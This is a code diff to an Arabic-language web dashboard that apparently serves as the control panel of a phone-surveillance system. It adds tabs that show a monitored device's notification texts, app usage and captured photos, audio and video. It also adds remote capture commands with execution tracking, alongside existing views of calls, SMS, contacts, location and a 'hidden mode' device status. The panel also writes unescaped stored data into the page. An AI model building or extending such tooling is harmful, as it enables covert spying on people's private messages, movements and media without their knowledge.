@@ -134,6 +134,7 @@ body { font-family: system-ui, sans-serif; background: #0f172a; color: #e2e8f0; 
       <span class="badge" id="deviceCount">0</span>
     </div>
     <div style="padding:8px 16px;border-bottom:1px solid #334155;font-size:12px">
+      <input type="text" id="deviceSearch" placeholder="🔍 بحث عن جهاز..." oninput="renderDeviceList()" style="width:100%;padding:8px 12px;background:#0f172a;border:1px solid #334155;border-radius:8px;color:#e2e8f0;font-size:13px;margin-bottom:8px">
       <label><input type="checkbox" id="showDeleted" onchange="renderDeviceList()"> إظهار المحذوفة</label>
     </div>
     <div class="device-list" id="deviceList"></div>
@@ -298,7 +299,17 @@ async function restoreDevice(serial) {
 function renderDeviceList() {
   const el = document.getElementById('deviceList');
   const showDeleted = document.getElementById('showDeleted')?.checked;
-  const filtered = showDeleted ? devices : devices.filter(d => d.is_active !== false);
+  const search = (document.getElementById('deviceSearch')?.value || '').toLowerCase().trim();
+  let filtered = showDeleted ? devices : devices.filter(d => d.is_active !== false);
+  if (search) {
+    filtered = filtered.filter(d =>
+      (d.device_serial || '').toLowerCase().includes(search) ||
+      (d.device_name || '').toLowerCase().includes(search) ||
+      (d.alias || '').toLowerCase().includes(search) ||
+      (d.manufacturer || '').toLowerCase().includes(search) ||
+      (d.model || '').toLowerCase().includes(search)
+    );
+  }
   el.innerHTML = filtered.map(d => {
     const isOnline = d.last_seen_at && (Date.now() - new Date(d.last_seen_at).getTime()) < 300000;
     const statusClass = d.is_active === false ? 'status-offline' : (d.is_stealth ? 'status-stealth' : (isOnline ? 'status-online' : 'status-offline'));
@@ -336,8 +347,8 @@ async function showDeviceDetail(serial) {
 async function renderTabContent() {
   if (!selectedDevice) return;
   const serial = selectedDevice.device_serial;
-  const tabs = ['overview', 'location', 'calls', 'sms', 'contacts', 'apps', 'state', 'commands'];
-  const tabLabels = { overview: 'ملخص', location: 'الموقع', calls: 'المكالمات', sms: 'الرسائل', contacts: 'جهات الاتصال', apps: 'التطبيقات', state: 'حالة الجهاز', commands: 'أوامر' };
+  const tabs = ['overview', 'location', 'calls', 'sms', 'contacts', 'apps', 'usage', 'notifications', 'media', 'state', 'commands'];
+  const tabLabels = { overview: 'ملخص', location: 'الموقع', calls: 'المكالمات', sms: 'الرسائل', contacts: 'جهات الاتصال', apps: 'التطبيقات', usage: 'الاستخدام', notifications: 'الإشعارات', media: 'الوسائط', state: 'حالة الجهاز', commands: 'أوامر' };
 
   let tabsHtml = '<div class="tabs">';
   for (const t of tabs) {
@@ -366,6 +377,9 @@ async function renderTab(tab) {
     case 'sms': await renderSms(el); break;
     case 'contacts': await renderContacts(el); break;
     case 'apps': await renderApps(el); break;
+    case 'usage': await renderAppUsage(el); break;
+    case 'notifications': await renderNotifications(el); break;
+    case 'media': await renderMedia(el); break;
     case 'state': await renderDeviceState(el); break;
     case 'commands': await renderCommands(el); break;
   }
@@ -374,38 +388,51 @@ async function renderTab(tab) {
 async function renderOverview(el) {
   const d = selectedDevice;
   el.innerHTML = `
+    <!-- Quick Actions -->
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px">
+      <button class="btn btn-sm btn-primary" onclick="sendCommand('capture_location')" style="width:auto">📍 تحديث الموقع</button>
+      <button class="btn btn-sm btn-primary" onclick="sendCommand('sync_now')" style="width:auto;background:#22c55e">🔄 مزامنة فورية</button>
+      <button class="btn btn-sm btn-outline" onclick="switchTab('commands')" style="width:auto">🎮 إرسال أمر</button>
+      <button class="btn btn-sm btn-outline" onclick="refreshDevices()" style="width:auto">⟳ تحديث</button>
+      ${d.is_active === false
+        ? `<button class="btn btn-sm btn-primary" onclick="restoreDevice('${d.device_serial}')" style="width:auto;background:#22c55e">↩ استعادة</button>`
+        : `<button class="btn btn-sm btn-danger" onclick="deleteDevice('${d.device_serial}')" style="width:auto">🗑 حذف</button>`}
+    </div>
+    <!-- Stats -->
     <div class="grid-4">
       <div class="card"><div class="card-header"><h3>الحالة</h3></div>
-        <div class="card-value" style="color:${d.is_active ? '#22c55e' : '#ef4444'}">${d.is_active ? 'نشط' : 'موقف'}</div>
+        <div class="card-value" style="color:${d.is_active ? '#22c55e' : '#ef4444'};font-size:20px">${d.is_active ? 'نشط' : 'موقف'}</div>
         <div class="card-sub">${d.is_stealth ? 'وضع مخفي' : 'ظاهر'}</div>
       </div>
       <div class="card"><div class="card-header"><h3>آخر ظهور</h3></div>
-        <div class="card-value" style="font-size:18px">${d.last_seen_at ? new Date(d.last_seen_at).toLocaleString('ar-SA') : '—'}</div>
+        <div class="card-value" style="font-size:16px">${d.last_seen_at ? new Date(d.last_seen_at).toLocaleString('ar-SA') : '—'}</div>
       </div>
       <div class="card"><div class="card-header"><h3>الجهاز</h3></div>
         <div style="font-size:14px;line-height:1.8">${d.manufacturer || '—'} ${d.model || ''}<br>${d.os_version || ''}<br>${d.phone_number || '—'}</div>
       </div>
-      <div class="card"><div class="card-header"><h3>الإجراءات</h3></div>
-        <button class="btn btn-sm btn-primary" onclick="switchTab('commands')" style="margin-bottom:8px">إرسال أمر</button>
-        <button class="btn btn-sm btn-outline" onclick="refreshDevices()" style="margin-bottom:8px">تحديث البيانات</button>
-        ${d.is_active === false
-          ? `<button class="btn btn-sm btn-primary" onclick="restoreDevice('${d.device_serial}')" style="background:#22c55e">استعادة الجهاز</button>`
-          : `<button class="btn btn-sm btn-danger" onclick="deleteDevice('${d.device_serial}')">حذف الجهاز</button>`}
+      <div class="card"><div class="card-header"><h3>سريع</h3></div>
+        <div style="font-size:13px;line-height:2">
+          📍 <a href="#" onclick="switchTab('location');return false" style="color:#3b82f6">الموقع</a><br>
+          📞 <a href="#" onclick="switchTab('calls');return false" style="color:#3b82f6">المكالمات</a><br>
+          💬 <a href="#" onclick="switchTab('sms');return false" style="color:#3b82f6">الرسائل</a>
+        </div>
       </div>
     </div>
+    <!-- Device Info -->
     <div class="card"><div class="card-header"><h3>معلومات الجهاز</h3></div>
       <table class="data-table">
         <tr><td>Device Serial</td><td>${d.device_serial}</td></tr>
-        <tr><td>الكنية (اسم مخصص)</td><td><input type="text" id="aliasInput" value="${d.alias || ''}" placeholder="أدخل كنية للجهاز" style="background:#0f172a;border:1px solid #334155;border-radius:6px;padding:4px 8px;color:#e2e8f0;width:200px;font-size:13px"> <button class="btn btn-sm btn-primary" onclick="saveAlias()">حفظ</button></td></tr>
+        <tr><td>الكنية</td><td><input type="text" id="aliasInput" value="${d.alias || ''}" placeholder="اسم مخصص" style="background:#0f172a;border:1px solid #334155;border-radius:6px;padding:4px 8px;color:#e2e8f0;width:200px;font-size:13px"> <button class="btn btn-sm btn-primary" onclick="saveAlias()">حفظ</button></td></tr>
         <tr><td>Device Token</td><td style="font-family:monospace;font-size:11px;color:#94a3b8">${d.device_token ? d.device_token.substring(0, 20) + '...' : '—'}</td></tr>
         <tr><td>IMEI</td><td>${d.imei || '—'}</td></tr>
         <tr><td>MAC (WiFi)</td><td>${d.wifi_mac || '—'}</td></tr>
         <tr><td>MAC (Bluetooth)</td><td>${d.bluetooth_mac || '—'}</td></tr>
         <tr><td>آخر IP</td><td>${d.last_ip_address || '—'}</td></tr>
         <tr><td>تاريخ التسجيل</td><td>${d.enrolled_at ? new Date(d.enrolled_at).toLocaleString('ar-SA') : '—'}</td></tr>
-        <tr><td>Admin Lock</td><td>${d.is_admin_locked ? 'نعم' : 'لا'}</td></tr>
+        <tr><td>Admin Lock</td><td>${d.is_admin_locked ? '🔒 نعم' : '🔓 لا'}</td></tr>
       </table>
-    </div>`;
+    </div>
+    <div id="cmdResult"></div>`;
 }
 
 async function renderLocation(el) {
@@ -515,6 +542,57 @@ async function renderApps(el) {
   </table></div>`;
 }
 
+async function renderAppUsage(el) {
+  const { data } = await sb.from('app_usage_stats').select('*').eq('device_serial', selectedDevice.device_serial).order('usage_date', { ascending: false }).limit(100);
+  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في بيانات استخدام</p></div>'; return; }
+  el.innerHTML = `<div class="card"><div class="card-header"><h3>إحصائيات استخدام التطبيقات (${data.length})</h3></div>
+    <table class="data-table">
+    <tr><th>التاريخ</th><th>التطبيق</th><th>مدة الاستخدام</th><th>آخر استخدام</th></tr>
+    ${data.map(r => `<tr>
+      <td class="timestamp">${r.usage_date ? new Date(r.usage_date).toLocaleDateString('ar-SA') : '—'}</td>
+      <td>${r.app_name || r.package_name || '—'}</td>
+      <td>${r.foreground_time_seconds ? Math.floor(r.foreground_time_seconds / 60) + ' دقيقة' : '—'}</td>
+      <td class="timestamp">${r.last_used_at ? new Date(r.last_used_at).toLocaleString('ar-SA') : '—'}</td>
+    </tr>`).join('')}
+  </table></div>`;
+}
+
+async function renderNotifications(el) {
+  const { data } = await sb.from('notification_logs').select('*').eq('device_serial', selectedDevice.device_serial).order('posted_at', { ascending: false }).limit(100);
+  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في إشعارات</p></div>'; return; }
+  el.innerHTML = `<div class="card"><div class="card-header"><h3>الإشعارات (${data.length})</h3></div>
+    <table class="data-table">
+    <tr><th>التاريخ</th><th>التطبيق</th><th>العنوان</th><th>النص</th></tr>
+    ${data.map(r => `<tr>
+      <td class="timestamp">${r.posted_at ? new Date(r.posted_at).toLocaleString('ar-SA') : '—'}</td>
+      <td>${r.app_name || r.package_name || '—'}</td>
+      <td style="font-weight:600">${r.title || '—'}</td>
+      <td style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${r.body || '—'}</td>
+    </tr>`).join('')}
+  </table></div>`;
+}
+
+async function renderMedia(el) {
+  const { data } = await sb.from('media_captures').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(50);
+  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في وسائط</p></div>'; return; }
+  el.innerHTML = `<div class="card"><div class="card-header"><h3>الوسائط الملتقطة (${data.length})</h3></div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px">
+    ${data.map(r => {
+      const isImage = r.mime_type?.startsWith('image/');
+      const isAudio = r.mime_type?.startsWith('audio/');
+      const isVideo = r.mime_type?.startsWith('video/');
+      return `<div style="background:#0f172a;border-radius:8px;padding:12px;border:1px solid #334155">
+        ${isImage ? `<img src="${r.file_url}" style="width:100%;height:140px;object-fit:cover;border-radius:6px;margin-bottom:8px" loading="lazy">` : ''}
+        ${isAudio ? `<audio controls style="width:100%;margin-bottom:8px"><source src="${r.file_url}"></audio>` : ''}
+        ${isVideo ? `<video controls style="width:100%;height:140px;object-fit:cover;border-radius:6px;margin-bottom:8px"><source src="${r.file_url}"></video>` : ''}
+        <div style="font-size:12px;color:#94a3b8">${r.media_type || '—'} · ${r.file_size_bytes ? formatBytes(r.file_size_bytes) : '—'}</div>
+        <div class="timestamp">${r.captured_at ? new Date(r.captured_at).toLocaleString('ar-SA') : ''}</div>
+        ${r.duration_seconds ? `<div style="font-size:12px;color:#94a3b8">المدة: ${r.duration_seconds}ث</div>` : ''}
+      </div>`;
+    }).join('')}
+    </div></div>`;
+}
+
 async function renderDeviceState(el) {
   const { data } = await sb.from('device_state_snapshots').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(50);
   if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في بيانات حالة</p></div>'; return; }
@@ -594,25 +672,47 @@ async function renderCommands(el) {
 
 async function sendCommand(command, params = {}) {
   if (!selectedDevice) { toast('ما في جهاز محدد'); return; }
-  const btn = document.querySelector(`.cmd-btn[onclick*="${command}"]`);
-  if (btn) { btn.textContent = 'جاري...'; btn.style.opacity = '.5'; }
+  const resultEl = document.getElementById('cmdResult');
+  resultEl.innerHTML = `<div class="cmd-result" style="color:#f59e0b">⏳ جاري إرسال الأمر "${getCmdLabel(command)}"...</div>`;
 
-  const { error } = await sb.from('remote_commands').insert({
+  const { data, error } = await sb.from('remote_commands').insert({
     device_serial: selectedDevice.device_serial,
     command,
     parameters: JSON.stringify(params),
     status: 'pending',
     sent_at: new Date().toISOString()
-  });
-
-  if (btn) setTimeout(() => { btn.textContent = getCmdLabel(command); btn.style.opacity = '1'; }, 2000);
+  }).select();
 
   if (error) {
-    document.getElementById('cmdResult').innerHTML = `<div class="cmd-result" style="color:#ef4444">✕ خطأ: ${error.message}</div>`;
-  } else {
-    document.getElementById('cmdResult').innerHTML = `<div class="cmd-result" style="color:#22c55e">✓ تم إرسال الأمر "${command}" بنجاح</div>`;
-    setTimeout(() => loadPrevCommands(), 1000);
+    resultEl.innerHTML = `<div class="cmd-result" style="color:#ef4444">✕ خطأ: ${error.message}</div>`;
+    return;
   }
+
+  const cmdId = data?.[0]?.id;
+  resultEl.innerHTML = `<div class="cmd-result" style="color:#f59e0b">⏳ تم الإرسال، في انتظار التنفيذ...</div>`;
+
+  // متابعة حالة الأمر لحين التنفيذ
+  let attempts = 0;
+  const maxAttempts = 30;
+  const check = setInterval(async () => {
+    attempts++;
+    const { data: cmd } = await sb.from('remote_commands').select('status,executed_at,result').eq('id', cmdId).single();
+    if (cmd?.status === 'executed') {
+      clearInterval(check);
+      resultEl.innerHTML = `<div class="cmd-result" style="color:#22c55e">✅ تم تنفيذ "${getCmdLabel(command)}" بنجاح ${cmd.executed_at ? 'الساعة ' + new Date(cmd.executed_at).toLocaleTimeString('ar-SA') : ''}</div>`;
+      loadPrevCommands();
+      if (['capture_location','capture_call_logs','capture_sms','capture_contacts','capture_apps'].includes(command)) {
+        setTimeout(() => renderTab(currentTab), 2000);
+      }
+    } else if (cmd?.status === 'failed') {
+      clearInterval(check);
+      resultEl.innerHTML = `<div class="cmd-result" style="color:#ef4444">✕ فشل التنفيذ: ${cmd.result || 'خطأ غير معروف'}</div>`;
+      loadPrevCommands();
+    } else if (attempts >= maxAttempts) {
+      clearInterval(check);
+      resultEl.innerHTML = `<div class="cmd-result" style="color:#f59e0b">⚠ انتهت مهلة الانتظار. قد يكون الجهاز غير متصل.</div>`;
+    }
+  }, 2000);
 }
 
 function getCmdLabel(cmd) {
